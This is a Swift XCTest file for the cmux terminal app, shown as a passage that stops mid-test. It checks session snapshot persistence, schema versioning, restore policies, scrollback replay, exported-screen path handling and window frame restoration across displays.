import XCTest

#if canImport(cmux_DEV)
@testable import cmux_DEV
#elseif canImport(cmux)
@testable import cmux
#endif

final class SessionPersistenceTests: XCTestCase {
    private struct LegacyPersistedWindowGeometry: Codable {
        let frame: SessionRectSnapshot
        let display: SessionDisplaySnapshot?
    }

    @MainActor
    func testWorkspaceSessionSnapshotRestoresMarkdownPanel() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-markdown-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }

        let markdownURL = root.appendingPathComponent("note.md")
        try "# hello\n".write(to: markdownURL, atomically: true, encoding: .utf8)

        let workspace = Workspace()
        let paneId = try XCTUnwrap(workspace.bonsplitController.allPaneIds.first)
        let panel = try XCTUnwrap(
            workspace.newMarkdownSurface(
                inPane: paneId,
                filePath: markdownURL.path,
                focus: true
            )
        )
        workspace.setCustomTitle("Docs")
        workspace.setPanelCustomTitle(panelId: panel.id, title: "Readme")

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)

        let restored = Workspace()
        restored.restoreSessionSnapshot(snapshot)

        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)
        let restoredPanel = try XCTUnwrap(restored.markdownPanel(for: restoredPanelId))
        XCTAssertEqual(restoredPanel.filePath, markdownURL.path)
        XCTAssertEqual(restored.customTitle, "Docs")
        XCTAssertEqual(restored.panelTitle(panelId: restoredPanelId), "Readme")
    }

    @MainActor
    func testSessionSnapshotSkipsTransientRemoteListeningPorts() throws {
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)
        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )

        workspace.configureRemoteConnection(configuration, autoConnect: false)
        workspace.surfaceListeningPorts[panelId] = [6969]

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)
        let panelSnapshot = try XCTUnwrap(snapshot.panels.first { $0.id == panelId })

        XCTAssertTrue(panelSnapshot.listeningPorts.isEmpty)
    }

    func testSaveAndLoadRoundTripWithCustomSnapshotPath() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        let snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))

        let loaded = SessionPersistenceStore.load(fileURL: snapshotURL)
        XCTAssertNotNil(loaded)
        XCTAssertEqual(loaded?.version, SessionSnapshotSchema.currentVersion)
        XCTAssertEqual(loaded?.windows.count, 1)
        XCTAssertEqual(loaded?.windows.first?.sidebar.selection, .tabs)
        let frame = try XCTUnwrap(loaded?.windows.first?.frame)
        XCTAssertEqual(frame.x, 10, accuracy: 0.001)
        XCTAssertEqual(frame.y, 20, accuracy: 0.001)
        XCTAssertEqual(frame.width, 900, accuracy: 0.001)
        XCTAssertEqual(frame.height, 700, accuracy: 0.001)
        XCTAssertEqual(loaded?.windows.first?.display?.displayID, 42)
        let visibleFrame = try XCTUnwrap(loaded?.windows.first?.display?.visibleFrame)
        XCTAssertEqual(visibleFrame.y, 25, accuracy: 0.001)
    }

    func testSaveAndLoadRoundTripPreservesWorkspaceCustomColor() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        var snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)
        snapshot.windows[0].tabManager.workspaces[0].customColor = "#C0392B"

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))

        let loaded = SessionPersistenceStore.load(fileURL: snapshotURL)
        XCTAssertEqual(
            loaded?.windows.first?.tabManager.workspaces.first?.customColor,
            "#C0392B"
        )
    }

    func testSaveSkipsRewritingIdenticalSnapshotData() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        let snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))
        let firstFileNumber = try fileNumber(for: snapshotURL)

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))
        let secondFileNumber = try fileNumber(for: snapshotURL)

        XCTAssertEqual(
            secondFileNumber,
            firstFileNumber,
            "Saving identical session data should not replace the snapshot file"
        )
    }

    func testWorkspaceCustomColorDecodeSupportsMissingLegacyField() throws {
        var snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)
        snapshot.windows[0].tabManager.workspaces[0].customColor = nil

        let encoder = JSONEncoder()
        let data = try encoder.encode(snapshot)
        let json = try XCTUnwrap(String(data: data, encoding: .utf8))
        XCTAssertFalse(json.contains("\"customColor\""))

        let decoded = try JSONDecoder().decode(AppSessionSnapshot.self, from: data)
        XCTAssertNil(decoded.windows.first?.tabManager.workspaces.first?.customColor)
    }

    func testLoadRejectsSchemaVersionMismatch() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        XCTAssertTrue(SessionPersistenceStore.save(makeSnapshot(version: SessionSnapshotSchema.currentVersion + 1), fileURL: snapshotURL))

        XCTAssertNil(SessionPersistenceStore.load(fileURL: snapshotURL))
    }

    func testDefaultSnapshotPathSanitizesBundleIdentifier() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let path = SessionPersistenceStore.defaultSnapshotFileURL(
            bundleIdentifier: "com.example/unsafe id",
            appSupportDirectory: tempDir
        )

        XCTAssertNotNil(path)
        XCTAssertTrue(path?.path.contains("com.example_unsafe_id") == true)
    }

    func testRestorePolicySkipsWhenLaunchHasExplicitArguments() {
        let shouldRestore = SessionRestorePolicy.shouldAttemptRestore(
            arguments: ["/Applications/cmux.app/Contents/MacOS/cmux", "--window", "window:1"],
            environment: [:]
        )

        XCTAssertFalse(shouldRestore)
    }

    func testRestorePolicyAllowsFinderStyleLaunchArgumentsOnly() {
        let shouldRestore = SessionRestorePolicy.shouldAttemptRestore(
            arguments: ["/Applications/cmux.app/Contents/MacOS/cmux", "-psn_0_12345"],
            environment: [:]
        )

        XCTAssertTrue(shouldRestore)
    }

    func testRestorePolicySkipsWhenRunningUnderXCTest() {
        let shouldRestore = SessionRestorePolicy.shouldAttemptRestore(
            arguments: ["/Applications/cmux.app/Contents/MacOS/cmux"],
            environment: ["XCTestConfigurationFilePath": "/tmp/xctest.xctestconfiguration"]
        )

        XCTAssertFalse(shouldRestore)
    }

    func testSidebarWidthSanitizationClampsToPolicyRange() {
        XCTAssertEqual(
            SessionPersistencePolicy.sanitizedSidebarWidth(-20),
            SessionPersistencePolicy.minimumSidebarWidth,
            accuracy: 0.001
        )
        XCTAssertEqual(
            SessionPersistencePolicy.sanitizedSidebarWidth(10_000),
            SessionPersistencePolicy.maximumSidebarWidth,
            accuracy: 0.001
        )
        XCTAssertEqual(
            SessionPersistencePolicy.sanitizedSidebarWidth(nil),
            SessionPersistencePolicy.defaultSidebarWidth,
            accuracy: 0.001
        )
    }

    func testSessionRectSnapshotEncodesXYWidthHeightKeys() throws {
        let snapshot = SessionRectSnapshot(x: 101.25, y: 202.5, width: 903.75, height: 704.5)
        let data = try JSONEncoder().encode(snapshot)
        let object = try XCTUnwrap(try JSONSerialization.jsonObject(with: data) as? [String: Double])

        XCTAssertEqual(Set(object.keys), Set(["x", "y", "width", "height"]))
        XCTAssertEqual(try XCTUnwrap(object["x"]), 101.25, accuracy: 0.001)
        XCTAssertEqual(try XCTUnwrap(object["y"]), 202.5, accuracy: 0.001)
        XCTAssertEqual(try XCTUnwrap(object["width"]), 903.75, accuracy: 0.001)
        XCTAssertEqual(try XCTUnwrap(object["height"]), 704.5, accuracy: 0.001)
    }

    func testSessionBrowserPanelSnapshotHistoryRoundTrip() throws {
        let profileID = try XCTUnwrap(UUID(uuidString: "8F03A658-5A84-428B-AD03-5A6D04692F64"))
        let source = SessionBrowserPanelSnapshot(
            urlString: "https://example.com/current",
            profileID: profileID,
            shouldRenderWebView: true,
            pageZoom: 1.2,
            developerToolsVisible: true,
            backHistoryURLStrings: [
                "https://example.com/a",
                "https://example.com/b"
            ],
            forwardHistoryURLStrings: [
                "https://example.com/d"
            ]
        )

        let data = try JSONEncoder().encode(source)
        let decoded = try JSONDecoder().decode(SessionBrowserPanelSnapshot.self, from: data)
        XCTAssertEqual(decoded.urlString, source.urlString)
        XCTAssertEqual(decoded.profileID, source.profileID)
        XCTAssertEqual(decoded.backHistoryURLStrings, source.backHistoryURLStrings)
        XCTAssertEqual(decoded.forwardHistoryURLStrings, source.forwardHistoryURLStrings)
    }

    func testSessionBrowserPanelSnapshotHistoryDecodesWhenKeysAreMissing() throws {
        let json = """
        {
          "urlString": "https://example.com/current",
          "shouldRenderWebView": true,
          "pageZoom": 1.0,
          "developerToolsVisible": false
        }
        """.data(using: .utf8)!

        let decoded = try JSONDecoder().decode(SessionBrowserPanelSnapshot.self, from: json)
        XCTAssertEqual(decoded.urlString, "https://example.com/current")
        XCTAssertNil(decoded.profileID)
        XCTAssertNil(decoded.backHistoryURLStrings)
        XCTAssertNil(decoded.forwardHistoryURLStrings)
    }

    func testScrollbackReplayEnvironmentWritesReplayFile() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-scrollback-replay-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let environment = SessionScrollbackReplayStore.replayEnvironment(
            for: "line one\nline two\n",
            tempDirectory: tempDir
        )

        let path = environment[SessionScrollbackReplayStore.environmentKey]
        XCTAssertNotNil(path)
        XCTAssertTrue(path?.hasPrefix(tempDir.path) == true)

        guard let path else { return }
        let contents = try? String(contentsOfFile: path, encoding: .utf8)
        XCTAssertEqual(contents, "line one\nline two\n")
    }

    func testScrollbackReplayEnvironmentSkipsWhitespaceOnlyContent() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-scrollback-replay-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let environment = SessionScrollbackReplayStore.replayEnvironment(
            for: " \n\t  ",
            tempDirectory: tempDir
        )

        XCTAssertTrue(environment.isEmpty)
    }

    func testScrollbackReplayEnvironmentPreservesANSIColorSequences() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-scrollback-replay-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let red = "\u{001B}[31m"
        let reset = "\u{001B}[0m"
        let source = "\(red)RED\(reset)\n"
        let environment = SessionScrollbackReplayStore.replayEnvironment(
            for: source,
            tempDirectory: tempDir
        )

        guard let path = environment[SessionScrollbackReplayStore.environmentKey] else {
            XCTFail("Expected replay file path")
            return
        }

        guard let contents = try? String(contentsOfFile: path, encoding: .utf8) else {
            XCTFail("Expected replay file contents")
            return
        }

        XCTAssertTrue(contents.contains("\(red)RED\(reset)"))
        XCTAssertTrue(contents.hasPrefix(reset))
        XCTAssertTrue(contents.hasSuffix(reset))
    }

    func testTruncatedScrollbackAvoidsLeadingPartialANSICSISequence() {
        let maxChars = SessionPersistencePolicy.maxScrollbackCharactersPerTerminal
        let source = "\u{001B}[31m"
            + String(repeating: "X", count: maxChars - 7)
            + "\u{001B}[0m"

        guard let truncated = SessionPersistencePolicy.truncatedScrollback(source) else {
            XCTFail("Expected truncated scrollback")
            return
        }

        XCTAssertFalse(truncated.hasPrefix("31m"))
        XCTAssertFalse(truncated.hasPrefix("[31m"))
        XCTAssertFalse(truncated.hasPrefix("m"))
    }

    func testNormalizedExportedScreenPathAcceptsAbsoluteAndFileURL() {
        XCTAssertEqual(
            TerminalController.normalizedExportedScreenPath("/tmp/cmux-screen.txt"),
            "/tmp/cmux-screen.txt"
        )
        XCTAssertEqual(
            TerminalController.normalizedExportedScreenPath(" file:///tmp/cmux-screen.txt "),
            "/tmp/cmux-screen.txt"
        )
    }

    func testNormalizedExportedScreenPathRejectsRelativeAndWhitespace() {
        XCTAssertNil(TerminalController.normalizedExportedScreenPath("relative/path.txt"))
        XCTAssertNil(TerminalController.normalizedExportedScreenPath("   "))
        XCTAssertNil(TerminalController.normalizedExportedScreenPath(nil))
    }

    func testShouldRemoveExportedScreenDirectoryOnlyWithinTemporaryRoot() {
        let tempRoot = URL(fileURLWithPath: "/tmp")
            .appendingPathComponent("cmux-export-tests-\(UUID().uuidString)", isDirectory: true)
        let tempFile = tempRoot
            .appendingPathComponent(UUID().uuidString, isDirectory: true)
            .appendingPathComponent("screen.txt", isDirectory: false)
        let outsideFile = URL(fileURLWithPath: "/Users/example/screen.txt")

        XCTAssertTrue(
            TerminalController.shouldRemoveExportedScreenDirectory(
                fileURL: tempFile,
                temporaryDirectory: tempRoot
            )
        )
        XCTAssertFalse(
            TerminalController.shouldRemoveExportedScreenDirectory(
                fileURL: outsideFile,
                temporaryDirectory: tempRoot
            )
        )
    }

    func testShouldRemoveExportedScreenFileOnlyWithinTemporaryRoot() {
        let tempRoot = URL(fileURLWithPath: "/tmp")
            .appendingPathComponent("cmux-export-tests-\(UUID().uuidString)", isDirectory: true)
        let tempFile = tempRoot
            .appendingPathComponent(UUID().uuidString, isDirectory: true)
            .appendingPathComponent("screen.txt", isDirectory: false)
        let outsideFile = URL(fileURLWithPath: "/Users/example/screen.txt")

        XCTAssertTrue(
            TerminalController.shouldRemoveExportedScreenFile(
                fileURL: tempFile,
                temporaryDirectory: tempRoot
            )
        )
        XCTAssertFalse(
            TerminalController.shouldRemoveExportedScreenFile(
                fileURL: outsideFile,
                temporaryDirectory: tempRoot
            )
        )
    }

    func testWindowUnregisterSnapshotPersistencePolicy() {
        XCTAssertTrue(
            AppDelegate.shouldPersistSnapshotOnWindowUnregister(isTerminatingApp: false)
        )
        XCTAssertFalse(
            AppDelegate.shouldPersistSnapshotOnWindowUnregister(isTerminatingApp: true)
        )
        XCTAssertTrue(
            AppDelegate.shouldRemoveSnapshotWhenNoWindowsRemainOnWindowUnregister(isTerminatingApp: false)
        )
        XCTAssertFalse(
            AppDelegate.shouldRemoveSnapshotWhenNoWindowsRemainOnWindowUnregister(isTerminatingApp: true)
        )
    }

    func testShouldSkipSessionSaveDuringStartupRestorePolicy() {
        XCTAssertTrue(
            AppDelegate.shouldSkipSessionSaveDuringStartupRestore(
                isApplyingStartupSessionRestore: true,
                includeScrollback: false
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionSaveDuringStartupRestore(
                isApplyingStartupSessionRestore: true,
                includeScrollback: true
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionSaveDuringStartupRestore(
                isApplyingStartupSessionRestore: false,
                includeScrollback: false
            )
        )
    }

    func testSessionAutosaveTickPolicySkipsWhenTerminating() {
        XCTAssertTrue(
            AppDelegate.shouldRunSessionAutosaveTick(isTerminatingApp: false)
        )
        XCTAssertFalse(
            AppDelegate.shouldRunSessionAutosaveTick(isTerminatingApp: true)
        )
    }

    func testSessionSnapshotSynchronousWritePolicy() {
        XCTAssertFalse(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: false,
                includeScrollback: false
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: false,
                includeScrollback: true
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: true,
                includeScrollback: false
            )
        )
        XCTAssertTrue(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: true,
                includeScrollback: true
            )
        )
    }

    func testUnchangedAutosaveFingerprintSkipsWithinStalenessWindow() {
        let now = Date()
        XCTAssertTrue(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: false,
                includeScrollback: false,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-5),
                now: now,
                maximumAutosaveSkippableInterval: 60
            )
        )
    }

    func testUnchangedAutosaveFingerprintDoesNotSkipAfterStalenessWindow() {
        let now = Date()
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: false,
                includeScrollback: false,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-120),
                now: now,
                maximumAutosaveSkippableInterval: 60
            )
        )
    }

    func testUnchangedAutosaveFingerprintNeverSkipsTerminatingOrScrollbackWrites() {
        let now = Date()
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: true,
                includeScrollback: false,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-1),
                now: now
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: false,
                includeScrollback: true,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-1),
                now: now
            )
        )
    }

    func testResolvedWindowFramePrefersSavedDisplayIdentity() {
        let savedFrame = SessionRectSnapshot(x: 1_200, y: 100, width: 600, height: 400)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 1_000, y: 0, width: 1_000, height: 800),
            visibleFrame: SessionRectSnapshot(x: 1_000, y: 0, width: 1_000, height: 800)
        )

        // Display 1 and 2 swapped horizontal positions between snapshot and restore.
        let display1 = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 1_000, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 1_000, y: 0, width: 1_000, height: 800)
        )
        let display2 = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_000, height: 800)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [display1, display2],
            fallbackDisplay: display1
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertTrue(display2.visibleFrame.intersects(restored))
        XCTAssertFalse(display1.visibleFrame.intersects(restored))
        XCTAssertEqual(restored.width, 600, accuracy: 0.001)
        XCTAssertEqual(restored.height, 400, accuracy: 0.001)
        XCTAssertEqual(restored.minX, 200, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 100, accuracy: 0.001)
    }

    func testResolvedWindowFrameKeepsIntersectingFrameWithoutDisplayMetadata() {
        let savedFrame = SessionRectSnapshot(x: 120, y: 80, width: 500, height: 350)
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_000, height: 800)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: nil,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 120, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 80, accuracy: 0.001)
        XCTAssertEqual(restored.width, 500, accuracy: 0.001)
        XCTAssertEqual(restored.height, 350, accuracy: 0.001)
    }

    func testResolvedStartupPrimaryWindowFrameFallsBackToPersistedGeometryWhenPrimaryMissing() {
        let fallbackFrame = SessionRectSnapshot(x: 180, y: 140, width: 900, height: 640)
        let fallbackDisplay = SessionDisplaySnapshot(
            displayID: 1,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
        )
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000)
        )

        let restored = AppDelegate.resolvedStartupPrimaryWindowFrame(
            primarySnapshot: nil,
            fallbackFrame: fallbackFrame,
            fallbackDisplaySnapshot: fallbackDisplay,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 180, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 140, accuracy: 0.001)
        XCTAssertEqual(restored.width, 900, accuracy: 0.001)
        XCTAssertEqual(restored.height, 640, accuracy: 0.001)
    }

    func testResolvedStartupPrimaryWindowFramePrefersPrimarySnapshotOverFallback() {
        let primarySnapshot = SessionWindowSnapshot(
            frame: SessionRectSnapshot(x: 220, y: 160, width: 980, height: 700),
            display: SessionDisplaySnapshot(
                displayID: 1,
                frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
                visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
            ),
            tabManager: SessionTabManagerSnapshot(selectedWorkspaceIndex: nil, workspaces: []),
            sidebar: SessionSidebarSnapshot(isVisible: true, selection: .tabs, width: 220)
        )
        let fallbackFrame = SessionRectSnapshot(x: 40, y: 30, width: 700, height: 500)
        let fallbackDisplay = SessionDisplaySnapshot(
            displayID: 1,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
        )
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000)
        )

        let restored = AppDelegate.resolvedStartupPrimaryWindowFrame(
            primarySnapshot: primarySnapshot,
            fallbackFrame: fallbackFrame,
            fallbackDisplaySnapshot: fallbackDisplay,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 220, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 160, accuracy: 0.001)
        XCTAssertEqual(restored.width, 980, accuracy: 0.001)
        XCTAssertEqual(restored.height, 700, accuracy: 0.001)
    }

    func testDecodedPersistedWindowGeometryDataAcceptsCurrentSchema() throws {
        let data = try JSONEncoder().encode(
            AppDelegate.PersistedWindowGeometry(
                version: AppDelegate.persistedWindowGeometrySchemaVersion,
                frame: SessionRectSnapshot(x: 220, y: 160, width: 980, height: 700),
                display: SessionDisplaySnapshot(
                    displayID: 1,
                    frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
                    visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
                )
            )
        )

        let decoded = try XCTUnwrap(AppDelegate.decodedPersistedWindowGeometryData(data))
        XCTAssertEqual(decoded.version, AppDelegate.persistedWindowGeometrySchemaVersion)
        XCTAssertEqual(decoded.frame.x, 220, accuracy: 0.001)
        XCTAssertEqual(decoded.frame.y, 160, accuracy: 0.001)
        XCTAssertEqual(decoded.frame.width, 980, accuracy: 0.001)
        XCTAssertEqual(decoded.frame.height, 700, accuracy: 0.001)
        XCTAssertEqual(decoded.display?.displayID, 1)
    }

    func testDecodedPersistedWindowGeometryDataRejectsLegacyUnversionedPayload() throws {
        let data = try JSONEncoder().encode(
            LegacyPersistedWindowGeometry(
                frame: SessionRectSnapshot(x: 180, y: 140, width: 900, height: 640),
                display: SessionDisplaySnapshot(
                    displayID: 1,
                    frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
                    visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
                )
            )
        )

        XCTAssertNil(AppDelegate.decodedPersistedWindowGeometryData(data))
    }

    func testDecodedPersistedWindowGeometryDataRejectsDifferentSchemaVersion() throws {
        let data = try JSONEncoder().encode(
            AppDelegate.PersistedWindowGeometry(
                version: AppDelegate.persistedWindowGeometrySchemaVersion + 1,
                frame: SessionRectSnapshot(x: 220, y: 160, width: 980, height: 700),
                display: nil
            )
        )

        XCTAssertNil(AppDelegate.decodedPersistedWindowGeometryData(data))
    }

    func testResolvedWindowFrameCentersInFallbackDisplayWhenOffscreen() {
        let savedFrame = SessionRectSnapshot(x: 4_000, y: 4_000, width: 900, height: 700)
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_000, height: 800)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: nil,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertTrue(display.visibleFrame.contains(restored))
        XCTAssertEqual(restored.minX, 50, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 50, accuracy: 0.001)
        XCTAssertEqual(restored.width, 900, accuracy: 0.001)
        XCTAssertEqual(restored.height, 700, accuracy: 0.001)
    }

    func testResolvedWindowFramePreservesExactGeometryWhenDisplayIsUnchanged() {
        let savedFrame = SessionRectSnapshot(x: 1_303, y: -90, width: 1_280, height: 1_410)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_410)
        )
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: CGRect(x: 0, y: 0, width: 2_560, height: 1_410)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 1_303, accuracy: 0.001)
        XCTAssertEqual(restored.minY, -90, accuracy: 0.001)
        XCTAssertEqual(restored.width, 1_280, accuracy: 0.001)
        XCTAssertEqual(restored.height, 1_410, accuracy: 0.001)
    }

    func testResolvedWindowFramePreservesExactGeometryWhenDisplayChangesButWindowRemainsAccessible() {
        let savedFrame = SessionRectSnapshot(x: 1_100, y: -20, width: 1_280, height: 1_000)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_410)
        )
        let adjustedDisplay = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: CGRect(x: 0, y: 40, width: 2_560, height: 1_360)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [adjustedDisplay],
            fallbackDisplay: adjustedDisplay
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 1_100, accuracy: 0.001)
        XCTAssertEqual(restored.minY, -20, accuracy: 0.001)
        XCTAssertEqual(restored.width, 1_280, accuracy: 0.001)
        XCTAssertEqual(restored.height, 1_000, accuracy: 0.001)
    }

    func testResolvedWindowFrameClampsWhenDisplayGeometryChangesEvenWithSameDisplayID() {
        let savedFrame = SessionRectSnapshot(x: 1_303, y: -90, width: 1_280, height: 1_410)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_410)
        )
        let resizedDisplay = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 1_920, height: 1_080),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_920, height: 1_050)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [resizedDisplay],
            fallbackDisplay: resizedDisplay
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertTrue(resizedDisplay.visibleFrame.contains(restored))
        XCTAssertNotEqual(restored.minX, 1_303, "Changed display geometry should clamp/remap frame")
